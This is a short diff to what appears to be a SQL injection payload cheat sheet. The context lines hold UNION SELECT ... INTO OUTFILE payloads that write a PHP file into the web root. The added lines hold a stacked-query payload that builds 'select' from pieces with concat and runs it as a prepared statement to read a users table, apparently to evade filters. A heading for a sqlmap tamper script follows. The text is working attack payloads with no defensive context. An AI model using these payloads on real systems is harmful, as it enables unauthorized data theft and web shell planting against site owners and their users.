@@ -24,6 +24,10 @@ union select 1,2,3,4,5,"<? phpinfo(); ?>" into outfile "/var/www/html/test.php"
 into outfile '/var/www/html/test.php" fields terminated by "<? phpinfo(); ?>"
 
 
+# stack
+id=1';Set @s=concat('sel','ect * from `users`');prepare tmp from @s; EXECUTE tmp;-- a
+
+
 # sqlmap tamper
 #!/usr/bin/env python
 
